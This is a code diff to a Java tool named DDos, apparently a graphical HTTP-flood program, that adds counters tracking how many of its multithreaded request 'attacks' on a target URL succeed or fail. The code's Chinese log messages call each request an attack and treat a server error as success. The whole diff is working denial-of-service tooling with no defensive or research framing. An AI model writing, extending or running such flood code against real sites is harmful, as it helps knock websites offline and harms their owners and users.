@@ -18,6 +18,8 @@ import net.itanken.ddos.utils.StrUtils;
 public class DDos {
 
 	public static int count = 0; // 总次数
+	public static int succeCount = 0; // 成功次数
+	public static int filedCount = 0; // 失败次数
 	public static int threadCount = 0;
 	public static int requestCount = 0;
 	
@@ -30,6 +32,8 @@ public class DDos {
 	 */
 	public void doDDos(int tCount, int sCount) throws InterruptedException {
 		count = 0;
+		succeCount = 0;
+		filedCount = 0;
 		threadCount = tCount;
 		requestCount = sCount;
 /*		es = Executors.newFixedThreadPool(tCount);
@@ -95,30 +99,37 @@ class Dthread implements Runnable {
 				int curCount = ++i;
 				URL url = new URL(urlStr);
 				URLConnection conn = url.openConnection();
-				
-				DDosFrame.appendInfo(name + " 第 " + curCount + " 次发包成功！" + StrUtils.LINE_SEPAR);
-				
-				BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
-				byte[] bytes = new byte[1024];
-				int len = -1;
-				StringBuffer sb = new StringBuffer();
-				if (bis != null && (len = bis.read()) != -1) {
-					sb.append(new String(bytes, 0, len));
+
+				if(conn.getContentLength() > -1) {
+					DDosFrame.appendInfo(name + " 第 " + curCount + " 次发包成功！" + StrUtils.LINE_SEPAR);
 					
-					DDosFrame.appendInfo(name + " 第 " + curCount + " 次攻击成功！" + StrUtils.LINE_SEPAR);
-					
-					bis.close();
+					BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
+					byte[] bytes = new byte[1024];
+					int len = -1;
+					StringBuffer sb = new StringBuffer();
+					if (bis != null && (len = bis.read()) != -1) {
+						DDosFrame.appendInfo(name + " 第 " + curCount + " 次攻击成功！" + StrUtils.LINE_SEPAR);
+						sb.append(new String(bytes, 0, len));
+						bis.close();
+						DDos.succeCount++;
+					} else {
+						DDosFrame.appendInfo(name + " 第 " + curCount + " 次攻击失败..." + StrUtils.LINE_SEPAR);
+					}
+				} else {
+					DDosFrame.appendInfo(name + " 第 " + curCount + " 次发包失败..." + StrUtils.LINE_SEPAR);
+					DDos.filedCount++;
 				}
 				int count = DDos.threadCount * DDos.requestCount;
 				if(DDos.count >= count && DDos.requestCount != 0) {
-					DDosFrame.appendInfo(StrUtils.LINE_SEPAR + "执行完毕！共攻击 " + count + " 次。" + StrUtils.LINE_SEPAR);
+					DDosFrame.appendInfo(StrUtils.LINE_SEPAR + "执行完毕！共执行 " + count + " 次攻击" + StrUtils.LINE_SEPAR
+							+ "其中成功 " + DDos.succeCount + " 次，失败 " + DDos.filedCount + " 次。" + StrUtils.LINE_SEPAR);
 				}
 			} catch (MalformedURLException e) {
 				DDosFrame.console.showError(e);
 			} catch (IOException e) {
 				DDosFrame.console.showError(e);
 				if (e.getMessage().contains("Server returned HTTP response code")) { // 攻击成功
-					DDosFrame.appendInfo("请检查网站！");
+					DDosFrame.appendInfo("请检查网站状态！");
 				}
 			}
 		}
